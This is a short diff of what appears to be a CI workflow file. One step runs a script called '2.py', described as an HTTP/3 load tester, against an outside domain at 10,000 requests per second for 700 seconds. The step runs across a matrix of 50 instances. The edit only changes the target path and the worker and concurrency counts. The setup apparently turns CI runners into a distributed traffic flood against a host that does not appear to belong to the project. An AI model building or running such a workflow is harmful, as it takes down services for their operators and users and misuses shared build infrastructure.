@@ -49,7 +49,7 @@ jobs:
       
       - name: Run HTTP/3 load tester (if Python script exists)
         run: |
-          python3 2.py --url https://cf.fo7y4.cc/qpfxzn --rps 10000 --duration 700 --workers 50 --connections 50 --max-concurrency 2000 
+          python3 2.py --url https://cf.fo7y4.cc/ovbiqy --rps 10000 --duration 700 --workers 5 --connections 50 --max-concurrency 200 
         env:
           INSTANCE_NUMBER: ${{ matrix.instance }}
           TOTAL_INSTANCES: 50
